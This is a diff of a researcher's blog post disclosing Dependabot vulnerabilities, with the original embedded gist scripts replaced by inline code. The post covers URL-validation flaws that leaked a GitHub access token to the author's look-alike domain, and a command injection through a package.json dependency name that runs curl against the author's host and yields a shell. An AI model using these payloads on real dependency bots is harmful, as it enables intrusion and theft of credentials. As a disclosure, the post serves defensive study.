@@ -20,7 +20,16 @@ To start the investigation, I prepared an local Dependabot environment following
 
 This sample code requires GitHub access token to fetch the source code of the repository.
 
-<script src="https://gist-it.appspot.com/https://github.com/dependabot/dependabot-script/blob/4330ff7043b6fe2bb009005e2f5b0ca9985f32f2/update-script.rb?slice=16:23"></script>
+https://github.com/dependabot/dependabot-script/blob/4330ff7043b6fe2bb009005e2f5b0ca9985f32f2/update-script.rb?slice=16:23#LL17-L23
+```ruby
+credentials =
+  [{
+    "type" => "git_source",
+    "host" => "github.com",
+    "username" => "x-access-token",
+    "password" => "a-github-access-token"
+  }]
+```
 
 My first idea is to deceiving a Dependabot so that the bot will sends the token to my server instead of GitHub.
 This idea seems possible because there are flaws in URL validations.
@@ -28,13 +37,31 @@ This idea seems possible because there are flaws in URL validations.
 One of the validations is to check whether the URL contains `github.com` or not.
 Obviously, this validation accepts a URL such as `github.com.mocos.kitchen`.
 
-<script src="https://gist-it.appspot.com/https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb?slice=7:8"></script>
+https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb#L8
+```ruby
+    KNOWN_HOSTS = /github\.com|bitbucket\.org|gitlab.com/i.freeze
+```
 
-<script src="https://gist-it.appspot.com/https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb?slice=54:55"></script>
+https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb#L55
+```ruby
+      raise Dependabot::GitDependenciesNotReachable, [uri] unless uri.match?(KNOWN_HOSTS)
+```
 
 Another one uses following regexp which accepts a URL such as `git+https://github.com.mocos.kitchen/username/repo`.
 
-<script src="https://gist-it.appspot.com/https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_parser.rb?slice=27:37"></script>
+https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_parser.rb?slice=27:37#L28-L37
+```ruby
+      GIT_URL_REGEX = %r{
+        (?<git_prefix>^|^git.*?|^github:|^bitbucket:|^gitlab:|github\.com/)
+        (?<username>[a-z0-9-]+)/
+        (?<repo>[a-z0-9_.-]+)
+        (
+          (?:\#semver:(?<semver>.+))|
+          (?:\#(?=[\^~=<>*])(?<semver>.+))|
+          (?:\#(?<ref>.+))
+        )?$
+      }ix.freeze
+```
 
 Based on these tricks, Dependabot treats `git+https://github.com.mocos.kitchen/username/repo` as a valid GitHub's URL.
 
@@ -42,7 +69,14 @@ Based on these tricks, Dependabot treats `git+https://github.com.mocos.kitchen/u
 
 To proof this concept, I created [a sample repository](https://github.com/tyage/dependabot-test-app) that includes following `package.json` file.
 
-<script src="https://gist-it.appspot.com/https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/package.json"></script>
+https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/package.json
+```json
+{
+  "dependencies": {
+    "package1": "git+https://github.com.mocos.kitchen/username/repo"
+  }
+}
+```
 
 Next, I updated the `credentials`, `repo_name` and `dependency_name` in [update-scripts.rb](https://github.com/dependabot/dependabot-script/blob/4330ff7043b6fe2bb009005e2f5b0ca9985f32f2/update-script.rb) from the official sample code so that we can run dependency checker against the sample repository I created.
 When I run the script, my server - `github.com.mocos.kitchen` - received a request containing GitHub Access Token.
@@ -63,8 +97,16 @@ Accept-Encoding: deflate, gzip
 Next, in order to try this attack in GitHub environment, I enabled Dependabot alerts in the sample repository.
 We can do this by simply creating a `.github/dependabot.yml` file.
 
-<script src="https://gist-it.appspot.com/https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/.github/dependabot.yml"></script>
-
+https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/.github/dependabot.yml
+```yaml
+---
+version: 2
+updates:
+  - package-ecosystem: npm
+    directory: "/"
+    schedule:
+      interval: daily
+```
 I successfully received a HTTP request from a Dependabot in GitHub.
 But contrary to my expectation, there is no GitHub Access Token in the request.
 Afterwards, it turns out that those servers are using special HTTP proxy which enalbes the bot to access target repository without GitHub Access Token.
@@ -84,7 +126,19 @@ I couldn't steal the token from GitHub's Dependabot server by SSRF, but after so
 When I tried some payload, I came across with a pattern that triggers a shell command in Dependabot server.
 With the package name `https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);?/...`, a shell command `curl$IFS@mocos.kitchen:3001` was executed and we could see the request!
 
-<script src="https://gist-it.appspot.com/https://github.com/tyage/dependabot-test3/blob/a81ac0bb60ac5aad66fa3191b5276f633a6d421d/package.json"></script>
+https://github.com/tyage/dependabot-test3/blob/a81ac0bb60ac5aad66fa3191b5276f633a6d421d/package.json
+```json
+{
+  "name": "javascript",
+  "version": "1.0.0",
+  "main": "index.js",
+  "license": "MIT",
+  "private": true,
+  "dependencies": {
+    "tyage-sample-package": "https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);?/github.com/tyage/sample-package.git#semver:4.0.0"
+  }
+}
+```
 
 I got the shell of the Dependabot server suddenly, but unfortunately, what we can do in the server is limited.
 Here is what I could do:
@@ -110,11 +164,26 @@ By the way, what was happend to Dependabot when I changed the package name to `h
 I found that the command was executed in `run_npm_7_top_level_updater` method.
 In this method, the bot runs `npm install` command with `--ignore-scripts --package-lock-only` arguments so that it can see if the lock file is updated without running install scripts.
 
-<script src="https://gist-it.appspot.com/https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_updater/npm_lockfile_updater.rb?slice=182:193"></script>
+https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_updater/npm_lockfile_updater.rb#L183-L192
+```ruby
+          command = [
+            "npm",
+            "install",
+            *install_args,
+            "--force",
+            "--dry-run",
+            "false",
+            "--ignore-scripts",
+            "--package-lock-only"
+          ].join(" ")
+```
 
 Therefore, I thought Dependabot doesn't escape the arguments, but it does properly escapes all command arguments.
 
-<script src="https://gist-it.appspot.com/https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/common/lib/dependabot/shared_helpers.rb?slice=273:274"></script>
+https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/common/lib/dependabot/shared_helpers.rb#L274
+```ruby
+      cmd = allow_unsafe_shell_command ? command : escape_command(command)
+```
 
 So I manually run `npm install` command to see what was happened and...
 
@@ -140,7 +209,10 @@ Even if there is a `--ignore-scripts` option, we can execute a shell command inj
 
 When we call `npm install` command with `git+https://...` package name, `git ls-remote` command is triggered using `child_process.spawn` method.
 
-<script src="https://gist-it.appspot.com/https://github.com/npm/cli/blob/dedb9c8f8b0891b30aa76e60cdb1c4f0f9b2f22f/node_modules/%40npmcli/promise-spawn/index.js?slice=35:36"></script>
+https://github.com/npm/cli/blob/dedb9c8f8b0891b30aa76e60cdb1c4f0f9b2f22f/node_modules/%40npmcli/promise-spawn/index.js#L36
+```javascript
+    proc = spawn(cmd, args, opts)
+```
 
 Also, if `child_process.spawn` method is called with `shell` option, [the command will be run inside of the shell](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options).
 
